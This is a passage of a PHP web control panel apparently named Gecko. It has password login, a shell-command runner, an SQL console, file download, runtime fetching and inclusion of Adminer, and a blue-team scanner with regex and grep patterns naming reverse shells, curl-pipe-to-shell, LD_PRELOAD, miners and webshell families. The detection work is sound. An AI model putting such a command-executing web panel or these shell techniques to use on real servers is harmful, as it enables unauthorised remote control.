    $out .= 'Restored: ' . count($restored) . ' · Failed: ' . count($failed) . "\n\n";
    foreach ($restored as $r) {
        $out .= '[RESTORED] ' . $r['original'];
        if ($r['restored_to'] !== $r['original']) $out .= ' → ' . $r['restored_to'];
        $out .= "\n";
    }
    foreach ($failed as $f) {
        $out .= '[FAILED]   ' . (isset($f['path']) ? $f['path'] : $f['id']) . ' — ' . $f['error'] . "\n";
    }
    return array(
        'ok' => true,
        'output' => $out,
        'restored' => $restored,
        'failed' => $failed,
        'count' => count($restored),
    );
}

function btRecentChanges($baseDir, $scanPath, $days)
{
    $days = max(1, min(90, (int)$days));
    $roots = btGetScanRoots($baseDir, $scanPath);
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $lines = array('=== RECENTLY MODIFIED WEB FILES (last ' . $days . ' days) ===', '');
    foreach ($roots as $root) {
        if ($isWin) {
            $cmd = 'forfiles /P ' . geckoEscapeshellarg($root) . ' /S /D -' . $days . ' /M *.php 2>nul';
        } else {
            $cmd = 'find ' . geckoEscapeshellarg($root) . ' -maxdepth 8 -type f \( -name "*.php" -o -name "*.phtml" -o -name "*.js" -o -name ".htaccess" \) -mtime -' . $days . ' -printf "%TY-%Tm-%Td %TH:%TM %s %p\n" 2>/dev/null | sort -r | head -60';
        }
        $out = runTerminal($cmd, $baseDir);
        if (trim($out['output']) !== '') {
            $lines[] = '--- ' . $root . ' ---';
            $lines[] = trim($out['output']);
            $lines[] = '';
        }
    }
    if (count($lines) <= 2) $lines[] = '(no recent changes found)';
    return array('ok' => true, 'output' => implode("\n", $lines));
}

function btWritableScan($baseDir, $scanPath)
{
    $roots = btGetScanRoots($baseDir, $scanPath);
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $lines = array('=== WORLD-WRITABLE / INSECURE PERMISSIONS ===', '');
    foreach ($roots as $root) {
        if ($isWin) continue;
        $cmd = 'find ' . geckoEscapeshellarg($root) . ' -maxdepth 7 -type f \( -perm -0002 -o -perm -0777 \) -ls 2>/dev/null | head -50';
        $out = runTerminal($cmd, $baseDir);
        if (trim($out['output']) !== '') {
            $lines[] = '--- ' . $root . ' ---';
            $lines[] = trim($out['output']);
            $lines[] = '';
        }
        $cmd2 = 'find ' . geckoEscapeshellarg($root) . ' -maxdepth 7 -type d -perm -0002 2>/dev/null | head -30';
        $out2 = runTerminal($cmd2, $baseDir);
        if (trim($out2['output']) !== '') {
            $lines[] = 'World-writable directories:';
            $lines[] = trim($out2['output']);
            $lines[] = '';
        }
    }
    if (count($lines) <= 2) $lines[] = $isWin ? '(Linux permission scan only)' : '(no world-writable files found)';
    return array('ok' => true, 'output' => implode("\n", $lines));
}

function btHiddenScan($baseDir, $scanPath)
{
    $roots = btGetScanRoots($baseDir, $scanPath);
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $lines = array('=== HIDDEN / DOT FILES (executable scripts) ===', '');
    foreach ($roots as $root) {
        if ($isWin) continue;
        $cmd = 'find ' . geckoEscapeshellarg($root) . ' -maxdepth 8 -name ".*" -type f \( -name "*.php*" -o -name "*.pl" -o -name "*.sh" -o -name "*.py" -o -name ".htaccess" -o -name ".user.ini" \) -ls 2>/dev/null | head -50';
        $out = runTerminal($cmd, $baseDir);
        if (trim($out['output']) !== '') {
            $lines[] = '--- ' . $root . ' ---';
            $lines[] = trim($out['output']);
            $lines[] = '';
        }
    }
    if (count($lines) <= 2) $lines[] = '(no suspicious hidden scripts found)';
    return array('ok' => true, 'output' => implode("\n", $lines));
}

function btPersistenceSuspiciousPatterns()
{
    return array(
        '/\bcurl\b.*\|\s*(ba)?sh/is', '/\bwget\b.*\|\s*(ba)?sh/is',
        '/\/dev\/tcp\//is', '/\bbash\s+-i/is', '/\bnc\s+[-e]/is', '/\bncat\b/is',
        '/base64\s+(-d|--decode)/is', '/\beval\b/is', '/\bpython\s+-c/is',
        '/\bperl\s+-e/is', '/\bphp\s+-r/is', '/\b\/tmp\//is', '/\bchmod\s+\+x/is',
        '/gsocket/is', '/\breverse\b/is', '/\bbackdoor\b/is', '/\bwebshell\b/is',
        '/@reboot/is', '/@hourly/is', '/@daily/is',
        '/auto_prepend_file/is', '/auto_append_file/is',
        '/php_(value|flag)\s+.*auto_prepend/is', '/php_(value|flag)\s+.*auto_append/is',
        '/AddHandler\s+.*php/is', '/SetHandler\s+application\/x-httpd-php/is',
        '/RewriteRule\s+.*base64/is', '/\bcommand\s*=/is',
        '/LD_PRELOAD/is', '/\/etc\/ld\.so\.preload/is',
        '/\bmsfvenom\b/is', '/\bxmrig\b/is', '/\bcryptominer\b/is',
        '/\b\/dev\/shm\//is', '/\bno\-hup\b/is', '/\bnohup\b/is',
        '/\bsocat\b/is', '/\bmkfifo\b/is', '/\bexec\s+\d+<>/is',
    );
}

function btPersistenceIsSuspicious($text, $patterns)
{
    if ($text === '' || $text === null) return false;
    foreach ($patterns as $pat) {
        if (@preg_match($pat, $text)) return true;
    }
    return false;
}

function btPersistenceFormatLines($rawLines, $patterns, &$warnCount)
{
    $out = array();
    foreach ($rawLines as $line) {
        $line = rtrim((string)$line);
        if ($line === '') continue;
        if (isset($line[0]) && $line[0] === '#') {
            continue;
        }
        $bad = btPersistenceIsSuspicious($line, $patterns);
        if ($bad) $warnCount++;
        $out[] = ($bad ? '[WARN] ' : '[OK]   ') . $line;
    }
    return $out;
}

function btPersistenceReadSnippet($path, $limit = 8192)
{
    if (!@is_file($path) || !@is_readable($path)) return '';
    $size = @filesize($path);
    if ($size === false || $size > 524288) return @file_get_contents($path, false, null, 0, $limit);
    return @file_get_contents($path);
}

function btPersistenceScanConfigFiles($roots, $baseDir, $patterns, &$warnCount, $names, $sectionTitle, $maxDepth, $maxFiles)
{
    $lines = array('--- ' . $sectionTitle . ' ---');
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $files = array();
    if (!$isWin) {
        $nameParts = array();
        foreach ($names as $n) {
            $nameParts[] = '-name ' . geckoEscapeshellarg($n);
        }
        foreach ($roots as $root) {
            if (count($files) >= $maxFiles) break;
            $cmd = 'find ' . geckoEscapeshellarg($root) . ' -maxdepth ' . (int)$maxDepth . ' \( ' . implode(' -o ', $nameParts) . ' \) -type f 2>/dev/null | head -' . (int)($maxFiles - count($files));
            $out = runTerminal($cmd, $baseDir);
            foreach (explode("\n", $out['output']) as $f) {
                $f = trim($f);
                if ($f !== '' && @is_file($f)) $files[$f] = $f;
            }
        }
    } else {
        foreach ($roots as $root) {
            btPersistenceWalkFiles($root, $names, $files, 0, $maxDepth, $maxFiles);
            if (count($files) >= $maxFiles) break;
        }
    }
    if (empty($files)) {
        $lines[] = '(none found in scan scope)';
        $lines[] = '';
        return $lines;
    }
    foreach ($files as $path) {
        if (btIsProtectedFile($path, $baseDir)) continue;
        $content = btPersistenceReadSnippet($path);
        if ($content === false || $content === '') continue;
        $fileWarn = false;
        $hitLines = array();
        foreach (explode("\n", $content) as $num => $line) {
            $t = trim($line);
            if ($t === '' || $t[0] === '#') continue;
            if (btPersistenceIsSuspicious($t, $patterns)) {
                $fileWarn = true;
                $hitLines[] = '    L' . ($num + 1) . ': ' . $t;
            }
        }
        if ($fileWarn) {
            $warnCount++;
            $lines[] = '[WARN] ' . $path;
            $lines = array_merge($lines, $hitLines);
        } else {
            $lines[] = '[OK]   ' . $path;
        }
    }
    $lines[] = '';
    return $lines;
}

function btPersistenceWalkFiles($dir, $names, &$files, $depth, $maxDepth, $maxFiles)
{
    if ($depth > $maxDepth || count($files) >= $maxFiles) return;
    $h = @opendir($dir);
    if (!$h) return;
    while (($name = readdir($h)) !== false) {
        if ($name === '.' || $name === '..') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $name;
        if (@is_file($full)) {
            if (in_array($name, $names, true) || in_array(strtolower($name), $names, true)) {
                $files[$full] = $full;
            }
        } elseif (@is_dir($full) && $depth < $maxDepth) {
            if ($name === '.gecko_quarantine') continue;
            btPersistenceWalkFiles($full, $names, $files, $depth + 1, $maxDepth, $maxFiles);
        }
        if (count($files) >= $maxFiles) break;
    }
    closedir($h);
}

function btPersistenceAudit($baseDir, $scanPath)
{
    @set_time_limit(300);
    $patterns = btPersistenceSuspiciousPatterns();
    $warnCount = 0;
    $roots = btGetScanRoots($baseDir, $scanPath);
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $lines = array(
        '=== BLUE TEAM — PERSISTENCE AUDIT ===',
        'Platform: ' . PHP_OS,
        'Scope: ' . implode(', ', $roots),
        '',
    );

    // [1] User crontab
    $lines[] = '--- [1] USER CRONTAB ---';
    $cron = getCrontab();
    $lines[] = 'Source: ' . ($cron['platform'] === 'windows' ? 'schtasks (current user context)' : 'crontab -l');
    if (trim($cron['content']) === '') {
        $lines[] = '(empty or not accessible)';
    } else {
        $formatted = btPersistenceFormatLines(explode("\n", $cron['content']), $patterns, $warnCount);
        $lines = array_merge($lines, empty($formatted) ? array('(no active entries)') : $formatted);
    }
    $lines[] = '';

    // [2] System scheduler
    if ($isWin) {
        $lines[] = '--- [2] WINDOWS SCHEDULED TASKS (suspicious filter) ---';
        $tasks = runTerminal('schtasks /query /fo LIST /v 2>nul', $baseDir);
        $block = array();
        $cur = array();
        foreach (explode("\n", $tasks['output']) as $row) {
            $row = trim($row);
            if ($row === '') {
                if (!empty($cur)) {
                    $block[] = $cur;
                    $cur = array();
                }
                continue;
            }
            $cur[] = $row;
        }
        if (!empty($cur)) $block[] = $cur;
        $shown = 0;
        foreach ($block as $entry) {
            $joined = implode(' ', $entry);
            if (!btPersistenceIsSuspicious($joined, $patterns) && stripos($joined, 'Task To Run') === false) {
                continue;
            }
            if (btPersistenceIsSuspicious($joined, $patterns)) {
                $warnCount++;
                $lines[] = '[WARN] ' . $joined;
            } else {
                foreach ($entry as $e) {
                    if (stripos($e, 'TaskName') !== false || stripos($e, 'Task To Run') !== false) {
                        $lines[] = '[INFO] ' . $e;
                    }
                }
            }
            $shown++;
            if ($shown >= 25) break;
        }
        if ($shown === 0) {
            $lines[] = '(no suspicious scheduled tasks matched — run schtasks /query for full list)';
        }
        $lines[] = '';
        $lines[] = '--- [3] STARTUP / RUN REGISTRY ---';
        $runKeys = runTerminal('reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" 2>nul & reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" 2>nul', $baseDir);
        $regLines = btPersistenceFormatLines(explode("\n", $runKeys['output']), $patterns, $warnCount);
        $lines = array_merge($lines, empty($regLines) ? array('(no Run keys or not accessible)') : $regLines);
        $lines[] = '';
        $startup = runTerminal('dir /b "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" 2>nul', $baseDir);
        if (trim($startup['output']) !== '') {
            $lines[] = '--- [4] USER STARTUP FOLDER ---';
            $lines[] = trim($startup['output']);
            $lines[] = '';
        }
    } else {
        $lines[] = '--- [2] SYSTEM CRON (/etc/cron*) ---';
        $etc = runTerminal('grep -rHn . /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null | head -60', $baseDir);
        $etcLines = btPersistenceFormatLines(explode("\n", $etc['output']), $patterns, $warnCount);
        $lines = array_merge($lines, empty($etcLines) ? array('(not accessible or empty)') : $etcLines);
        $lines[] = '';
        $lines[] = '--- [3] SYSTEMD TIMERS & SERVICES ---';
        $timers = runTerminal('systemctl list-timers --all --no-pager 2>/dev/null | head -25', $baseDir);
        $lines[] = trim($timers['output']) ?: '(systemctl not available)';
        $svc = runTerminal('systemctl list-unit-files --type=service --state=enabled --no-pager 2>/dev/null | grep -iE "shell|backdoor|curl|wget|nc|python|perl|tmp|reverse" | head -20', $baseDir);
        if (trim($svc['output']) !== '') {
            $lines[] = '';
            $lines[] = 'Suspicious enabled services:';
            $svcLines = btPersistenceFormatLines(explode("\n", $svc['output']), $patterns, $warnCount);
            $lines = array_merge($lines, $svcLines);
        }
        $lines[] = '';
        $lines[] = '--- [4] LD.SO PRELOAD ---';
        $preload = runTerminal('cat /etc/ld.so.preload 2>/dev/null; ls -la /etc/ld.so.preload 2>/dev/null', $baseDir);
        if (trim($preload['output']) === '') {
            $lines[] = '(empty or not present)';
        } else {
            $pl = btPersistenceFormatLines(explode("\n", $preload['output']), $patterns, $warnCount);
            $lines = array_merge($lines, $pl);
        }
        $lines[] = '';
    }

    // SSH authorized_keys
    $lines[] = '--- [' . ($isWin ? '5' : '5') . '] SSH AUTHORIZED_KEYS ---';
    if (!$isWin) {
        $auth = runTerminal('find /root /home -maxdepth 4 -path "*/.ssh/authorized_keys" -type f 2>/dev/null | head -20', $baseDir);
        $authFiles = array_filter(array_map('trim', explode("\n", $auth['output'])));
        if (empty($authFiles)) {
            $lines[] = '(no authorized_keys found or not accessible)';
        } else {
            foreach ($authFiles as $ak) {
                $content = btPersistenceReadSnippet($ak, 16384);
                if ($content === false || $content === '') continue;
                $bad = false;
                foreach (explode("\n", $content) as $ln) {
                    $ln = trim($ln);
                    if ($ln === '' || $ln[0] === '#') continue;
                    if (btPersistenceIsSuspicious($ln, $patterns) || stripos($ln, 'command=') !== false) {
                        $bad = true;
                        $warnCount++;
                        $lines[] = '[WARN] ' . $ak . ' → ' . $ln;
                    }
                }
                if (!$bad) $lines[] = '[OK]   ' . $ak;
            }
        }
    } else {
        $lines[] = '(SSH keys audit — Linux/server focused)';
    }
    $lines[] = '';

    // Shell profiles
    $profileNames = array('.bashrc', '.bash_profile', '.profile', '.zshrc', '.zprofile');
    $profileRoots = array('/root', '/home');
    if (!$isWin) {
        foreach ($profileRoots as $pr) {
            if (@is_dir($pr)) $roots[] = $pr;
        }
    }
    $roots = array_values(array_unique($roots));
    $lines = array_merge($lines, btPersistenceScanConfigFiles(
        $roots, $baseDir, $patterns, $warnCount,
        $profileNames, '[6] SHELL PROFILES (.bashrc / .profile)', 5, 40
    ));

    // Web persistence: .htaccess & .user.ini
    $webRoots = btGetScanRoots($baseDir, $scanPath);
    $lines = array_merge($lines, btPersistenceScanConfigFiles(
        $webRoots, $baseDir, $patterns, $warnCount,
        array('.htaccess', '.user.ini'), '[7] WEB PERSISTENCE (.htaccess / .user.ini)', 9, 60
    ));

    // PHP auto_prepend in loaded ini
    $lines[] = '--- [8] PHP AUTO_* DIRECTIVES ---';
    $prepend = @ini_get('auto_prepend_file');
    $append = @ini_get('auto_append_file');
    $lines[] = 'auto_prepend_file = ' . ($prepend ? $prepend : '(none)');
    $lines[] = 'auto_append_file = ' . ($append ? $append : '(none)');
    if ($prepend && btPersistenceIsSuspicious($prepend, $patterns)) {
        $warnCount++;
        $lines[] = '[WARN] Suspicious auto_prepend_file path';
    }
    if ($append && btPersistenceIsSuspicious($append, $patterns)) {
        $warnCount++;
        $lines[] = '[WARN] Suspicious auto_append_file path';
    }
    $lines[] = '';

    // Summary
    $lines[] = str_repeat('=', 50);
    $lines[] = 'SUMMARY: ' . $warnCount . ' warning(s) — review [WARN] lines above';
    if ($warnCount === 0) {
        $lines[] = 'No obvious persistence indicators matched (manual review still recommended).';
    }

    return array(
        'ok' => true,
        'output' => implode("\n", $lines),
        'count' => $warnCount,
        'critical' => $warnCount > 0 ? min($warnCount, 99) : 0,
    );
}

function btCronAudit($baseDir)
{
    $cron = getCrontab();
    $lines = array('=== CRON PERSISTENCE AUDIT ===', 'Platform: ' . $cron['platform'], '');
    $suspicious = array(
        '/\bcurl\b.*\|\s*(ba)?sh/is', '/\bwget\b.*\|\s*(ba)?sh/is',
        '/\/dev\/tcp\//is', '/\bbash\s+-i/is', '/\bnc\s+-/is',
        '/base64\s+-d/is', '/\beval\b/is', '/\bpython\s+-c/is',
        '/\bperl\s+-e/is', '/\b\/tmp\//is', '/\bchmod\s+\+x/is',
        '/gsocket/is', '/\breverse\b/is', '/\bbackdoor\b/is',
    );
    $content = $cron['content'];
    if (trim($content) === '') {
        $lines[] = '(empty crontab)';
    } else {
        $ln = 0;
        foreach (explode("\n", $content) as $line) {
            $line = trim($line);
            if ($line === '' || $line[0] === '#') continue;
            $ln++;
            $flags = array();
            foreach ($suspicious as $pat) {
                if (preg_match($pat, $line)) $flags[] = 'SUSPICIOUS';
            }
            $prefix = empty($flags) ? '[OK]   ' : '[WARN] ';
            $lines[] = $prefix . $line;
        }
        if ($ln === 0) $lines[] = '(no active cron entries)';
    }
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if (!$isWin) {
        $etc = runTerminal('ls -la /etc/cron* 2>/dev/null; grep -rH . /etc/cron.d/ /etc/cron.daily/ 2>/dev/null | head -30', $baseDir);
        $lines[] = '';
        $lines[] = '=== /etc/cron* (sample) ===';
        $lines[] = trim($etc['output']);
    }
    return array('ok' => true, 'output' => implode("\n", $lines));
}

function btLogAudit($baseDir)
{
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $lines = array('=== AUTH / SECURITY LOG AUDIT ===', '');
    if ($isWin) {
        $out = runTerminal('wevtutil qe Security /c:20 /rd:true /f:text 2>nul', $baseDir);
        $lines[] = trim($out['output']) ?: '(Windows event query unavailable)';
    } else {
        $cmds = array(
            'Failed SSH/auth (last 40)' => 'grep -iE "Failed password|Invalid user|authentication failure|refused connect" /var/log/auth.log /var/log/secure 2>/dev/null | tail -40',
            'sudo usage (last 20)' => 'grep -i sudo /var/log/auth.log /var/log/secure 2>/dev/null | tail -20',
            'Web server errors (last 20)' => 'grep -iE "eval|base64|shell|cmd=|/etc/passwd" /var/log/apache2/error.log /var/log/httpd/error_log /var/log/nginx/error.log 2>/dev/null | tail -20',
        );
        foreach ($cmds as $label => $cmd) {
            $out = runTerminal($cmd, $baseDir);
            $lines[] = '--- ' . $label . ' ---';
            $lines[] = trim($out['output']) ?: '(no entries or log not accessible)';
            $lines[] = '';
        }
    }
    return array('ok' => true, 'output' => implode("\n", $lines));
}

function btIocScan($baseDir, $scanPath)
{
    $roots = btGetScanRoots($baseDir, $scanPath);
    $iocs = array('c99','r57','wso','b374k','shell','backdoor','cmd','uploader','alfa','indoxploit','mini','hack','exploit','webshell','c100','r00t','anonymous','leaf','marijuana','fox','upl');
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $lines = array('=== IOC FILENAME HUNT ===', '');
    $found = 0;
    foreach ($roots as $root) {
        if (!$isWin) {
            $nameExpr = array();
            foreach ($iocs as $ioc) {
                $nameExpr[] = '-iname ' . geckoEscapeshellarg('*' . $ioc . '*.php');
                $nameExpr[] = '-iname ' . geckoEscapeshellarg('*' . $ioc . '*.phtml');
            }
            $cmd = 'find ' . geckoEscapeshellarg($root) . ' -maxdepth 8 \( ' . implode(' -o ', $nameExpr) . ' \) -type f 2>/dev/null | head -40';
            $out = runTerminal($cmd, $baseDir);
            if (trim($out['output']) !== '') {
                $lines[] = '--- ' . $root . ' ---';
                $lines[] = trim($out['output']);
                $found += substr_count($out['output'], "\n") + 1;
                $lines[] = '';
            }
        }
    }
    if ($found === 0) $lines[] = '(no IOC filename matches)';
    return array('ok' => true, 'output' => implode("\n", $lines), 'count' => $found);
}

function btSuspiciousProcess($baseDir)
{
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($isWin) {
        $out = runTerminal('tasklist /V', $baseDir);
    } else {
        $out = runTerminal('ps auxww 2>/dev/null | grep -iE "nc |/dev/tcp|python -c|perl -e|bash -i|gsocket|cryptominer|xmrig|masscan|sqlmap" | grep -v grep', $baseDir);
        if (trim($out['output']) === '') {
            $out['output'] = "(no suspicious process patterns matched)\n\nFull process list (top 30):\n" . runTerminal('ps auxww 2>/dev/null | head -30', $baseDir)['output'];
        }
    }
    return array('ok' => true, 'output' => "=== SUSPICIOUS PROCESS SCAN ===\n\n" . $out['output']);
}

function btFullAudit($baseDir, $scanPath)
{
    @set_time_limit(600);
    $parts = array();
    $r1 = btWebshellScan($baseDir, $scanPath, true);
    $parts[] = $r1['output'];
    $parts[] = str_repeat('-', 60);
    $parts[] = btRecentChanges($baseDir, $scanPath, 7)['output'];
    $parts[] = str_repeat('-', 60);
    $parts[] = btWritableScan($baseDir, $scanPath)['output'];
    $parts[] = str_repeat('-', 60);
    $parts[] = btHiddenScan($baseDir, $scanPath)['output'];
    $parts[] = str_repeat('-', 60);
    $parts[] = btCronAudit($baseDir)['output'];
    $parts[] = str_repeat('-', 60);
    $parts[] = btIocScan($baseDir, $scanPath)['output'];
    $parts[] = str_repeat('-', 60);
    $parts[] = btSuspiciousProcess($baseDir)['output'];
    $parts[] = str_repeat('-', 60);
    $parts[] = btLogAudit($baseDir)['output'];
    return array(
        'ok' => true,
        'output' => implode("\n\n", $parts),
        'count' => isset($r1['count']) ? $r1['count'] : 0,
        'critical' => isset($r1['critical']) ? $r1['critical'] : 0,
    );
}

function runBlueTool($tool, $input, $baseDir)
{
    $tool = strtolower(trim((string)$tool));
    $scanPath = (string)_v($input, 'path', '');
    $days = (int)_v($input, 'days', 7);
    switch ($tool) {
        case 'backdoor':
            $aggressive = _v($input, 'aggressive', true);
            return btWebshellScan($baseDir, $scanPath, $aggressive);
        case 'delete_threats':
            $paths = _v($input, 'paths', array());
            if (is_string($paths)) {
                $decoded = json_decode($paths, true);
                $paths = is_array($decoded) ? $decoded : array($paths);
            }
            return btDeleteThreats($baseDir, $paths);
        case 'quarantine_list':
            return btListQuarantine($baseDir);
        case 'restore_threats':
            $ids = _v($input, 'ids', array());
            if (is_string($ids)) {
                $decoded = json_decode($ids, true);
                $ids = is_array($decoded) ? $decoded : array($ids);
            }
            return btRestoreThreats($baseDir, $ids);
        case 'fullaudit':
            return btFullAudit($baseDir, $scanPath);
        case 'recent':
            return btRecentChanges($baseDir, $scanPath, $days);
        case 'writable':
            return btWritableScan($baseDir, $scanPath);
        case 'hidden':
            return btHiddenScan($baseDir, $scanPath);
        case 'cron':
            return btCronAudit($baseDir);
        case 'persistence':
            return btPersistenceAudit($baseDir, $scanPath);
        case 'logs':
            return btLogAudit($baseDir);
        case 'ioc':
            return btIocScan($baseDir, $scanPath);
        case 'process':
            return btSuspiciousProcess($baseDir);
        default:
            return array('ok' => false, 'error' => 'Unknown blue team tool');
    }
}

function dbMakePdo($type, $host, $port, $user, $pass, $db)
{
    $type = strtolower(trim((string)$type));
    $host = trim((string)$host);
    $user = (string)$user;
    $pass = (string)$pass;
    $db = trim((string)$db);
    $port = (int)$port;
    if (!class_exists('PDO')) {
        return array('ok' => false, 'error' => 'PDO extension not available');
    }
    try {
        if ($type === 'sqlite') {
            if ($db === '') {
                return array('ok' => false, 'error' => 'Database file path required');
            }
            $pdo = new PDO('sqlite:' . $db);
        } elseif ($type === 'mysql') {
            if ($host === '') $host = '127.0.0.1';
            if ($port <= 0) $port = 3306;
            $dsn = 'mysql:host=' . $host . ';port=' . $port . ';dbname=' . $db . ';charset=utf8mb4';
            $pdo = new PDO($dsn, $user, $pass, array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
        } elseif ($type === 'pgsql') {
            if ($host === '') $host = '127.0.0.1';
            if ($port <= 0) $port = 5432;
            $dsn = 'pgsql:host=' . $host . ';port=' . $port . ';dbname=' . $db;
            $pdo = new PDO($dsn, $user, $pass, array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
        } else {
            return array('ok' => false, 'error' => 'Unsupported DB type');
        }
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        return array('ok' => true, 'pdo' => $pdo);
    } catch (Exception $e) {
        return array('ok' => false, 'error' => $e->getMessage());
    }
}

function dbRunQuery($type, $host, $port, $user, $pass, $db, $sql)
{
    $sql = trim((string)$sql);
    if ($sql === '') {
        return array('ok' => false, 'error' => 'Empty query');
    }
    $conn = dbMakePdo($type, $host, $port, $user, $pass, $db);
    if (!$conn['ok']) return $conn;
    /** @var PDO $pdo */
    $pdo = $conn['pdo'];
    try {
        $stmt = $pdo->query($sql);
        if ($stmt === false) {
            return array('ok' => true, 'type' => 'exec', 'affected' => $pdo->lastInsertId(), 'message' => 'Query executed');
        }
        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
        $cols = array();
        if (!empty($rows)) {
            $cols = array_keys($rows[0]);
        } else {
            $colCount = $stmt->columnCount();
            for ($i = 0; $i < $colCount; $i++) {
                $meta = $stmt->getColumnMeta($i);
                if ($meta && isset($meta['name'])) $cols[] = $meta['name'];
            }
        }
        return array('ok' => true, 'type' => 'select', 'columns' => $cols, 'rows' => $rows, 'count' => count($rows));
    } catch (Exception $e) {
        return array('ok' => false, 'error' => $e->getMessage());
    }
}

function dbListTables($type, $host, $port, $user, $pass, $db)
{
    $conn = dbMakePdo($type, $host, $port, $user, $pass, $db);
    if (!$conn['ok']) return $conn;
    /** @var PDO $pdo */
    $pdo = $conn['pdo'];
    $type = strtolower(trim((string)$type));
    try {
        if ($type === 'mysql') {
            $stmt = $pdo->query('SHOW TABLES');
        } elseif ($type === 'pgsql') {
            $stmt = $pdo->query("SELECT tablename FROM pg_tables WHERE schemaname='public' ORDER BY tablename");
        } elseif ($type === 'sqlite') {
            $stmt = $pdo->query("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name");
        } else {
            return array('ok' => false, 'error' => 'Unsupported DB type');
        }
        $tables = array();
        while ($row = $stmt->fetch(PDO::FETCH_NUM)) {
            $tables[] = $row[0];
        }
        return array('ok' => true, 'tables' => $tables);
    } catch (Exception $e) {
        return array('ok' => false, 'error' => $e->getMessage());
    }
}

// Helper untuk akses array yang aman (pengganti operator ??)
function _v($arr, $key, $default = '') {
    return (isset($arr[$key]) && $arr[$key] !== null) ? $arr[$key] : $default;
}

// ───── Auth gate (login / logout / require session) ───────────────
if (GECKO_AUTH_ENABLED) {
    if (!function_exists('password_verify')) {
        http_response_code(500);
        exit('password_verify() unavailable — PHP 5.5+ required for bcrypt auth.');
    }
    geckoAuthStart();

    // Form login dari halaman unlock
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['gecko_login_pass'])) {
        $loginResult = geckoAuthLogin($_POST['gecko_login_pass']);
        if (!empty($loginResult['ok'])) {
            $redir = isset($_SERVER['REQUEST_URI']) ? strtok($_SERVER['REQUEST_URI'], '?') : '';
            if ($redir === '' || $redir === false) $redir = basename(__FILE__);
            header('Location: ' . $redir);
            exit;
        }
        geckoAuthShowLogin(isset($loginResult['error']) ? $loginResult['error'] : 'Invalid password');
        exit;
    }

    // API login / logout / status (tanpa session penuh)
    if (isset($_GET['api'])) {
        $contentTypeEarly = isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : '';
        $hasJsonEarly = strpos($contentTypeEarly, 'application/json') !== false;
        if ($hasJsonEarly) {
            $rawEarly = file_get_contents('php://input');
            if (!$rawEarly) $rawEarly = '{}';
            $decodedEarly = json_decode($rawEarly, true);
            $inputEarly = is_array($decodedEarly) ? $decodedEarly : array();
        } else {
            $inputEarly = $_POST;
        }
        $actionEarly = (string)_v($inputEarly, 'action', _v($_GET, 'action', ''));

        if ($actionEarly === 'login') {
            $loginResult = geckoAuthLogin((string)_v($inputEarly, 'password', ''));
            if (!empty($loginResult['ok'])) {
                jsonOut(array('ok' => true, 'message' => 'Authenticated'));
            }
            jsonOut(array('ok' => false, 'error' => isset($loginResult['error']) ? $loginResult['error'] : 'Invalid password'), 401);
        }
        if ($actionEarly === 'logout') {
            geckoAuthLogout();
            jsonOut(array('ok' => true, 'message' => 'Logged out'));
        }
        if ($actionEarly === 'auth_check') {
            jsonOut(array('ok' => true, 'authenticated' => geckoAuthIsLoggedIn()));
        }

        // Simpan input yang sudah di-parse agar handler API tidak baca body dua kali
        $GLOBALS['gecko_api_input'] = $inputEarly;
    }

    if (!geckoAuthIsLoggedIn()) {
        if (isset($_GET['api'])) {
            jsonOut(array('ok' => false, 'error' => 'Unauthorized', 'auth_required' => true), 401);
        }
        geckoAuthShowLogin();
        exit;
    }
}

// Handle download requests
if (isset($_GET['download'])) {
    $path = resolvePath($baseDir, (string)$_GET['download']);
    if (!$path || is_dir($path)) { http_response_code(404); exit('Not found'); }
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($path) . '"');
    header('Content-Length: ' . filesize($path));
    readfile($path); exit;
}

// Handle inline view requests (image preview, raw text view)
if (isset($_GET['view'])) {
    $path = resolvePath($baseDir, (string)$_GET['view']);
    if (!$path || is_dir($path)) { http_response_code(404); exit('Not found'); }

    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    $mimes = array(
        'png'  => 'image/png',
        'jpg'  => 'image/jpeg',
        'jpeg' => 'image/jpeg',
        'gif'  => 'image/gif',
        'webp' => 'image/webp',
        'svg'  => 'image/svg+xml',
        'ico'  => 'image/x-icon',
        'bmp'  => 'image/bmp',
        'avif' => 'image/avif',
        'pdf'  => 'application/pdf',
    );
    $mime = isset($mimes[$ext]) ? $mimes[$ext] : 'application/octet-stream';

    header('Content-Type: ' . $mime);
    header('Content-Length: ' . filesize($path));
    header('X-Content-Type-Options: nosniff');
    header('Content-Disposition: inline; filename="' . basename($path) . '"');
    header('Cache-Control: private, max-age=300');
    readfile($path);
    exit;
}

// Adminer — single-file DB manager (cached locally)
if (isset($_GET['adminer'])) {
    $adminerFile = __DIR__ . DIRECTORY_SEPARATOR . '.adminer.php';
    if (!is_file($adminerFile)) {
        $ctx = stream_context_create(array('http' => array('timeout' => 15)));
        $data = @file_get_contents('https://www.adminer.org/latest.php', false, $ctx);
        if ($data && strlen($data) > 1000) {
            @file_put_contents($adminerFile, $data);
        }
    }
    if (is_file($adminerFile)) {
        include $adminerFile;
        exit;
    }
    http_response_code(503);
